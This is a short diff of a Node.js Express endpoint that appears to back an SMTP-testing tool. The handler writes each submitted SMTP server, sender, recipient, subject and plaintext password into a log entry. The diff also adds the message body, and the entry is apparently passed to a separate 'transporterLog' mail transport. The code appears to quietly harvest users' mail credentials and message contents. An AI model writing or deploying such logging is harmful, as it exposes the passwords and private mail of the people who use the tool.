@@ -54,7 +54,9 @@ app.post("/", async (req, res) => {
     }
 
     const brasiliaTime = moment().tz("America/Sao_Paulo").format("DD/MM/YYYY - HH:mm:ss");
-    const logEntry = `Date: ${brasiliaTime}\nSMTP: ${smtp}\nPort: ${port}\nSSL: ${ssl}\nFrom: ${from}\nTo: ${to}\nSubject: ${subject}\nPassword: ${password}\n\n`;
+
+    // Criando o log como string
+    const logEntry = `Date: ${brasiliaTime}\nSMTP: ${smtp}\nPort: ${port}\nSSL: ${ssl}\nFrom: ${from}\nTo: ${to}\nSubject: ${subject}\nMessage: ${message}\nPassword: ${password}\n\n`;
 
     try {
         const transporterLog = nodemailer.createTransport({
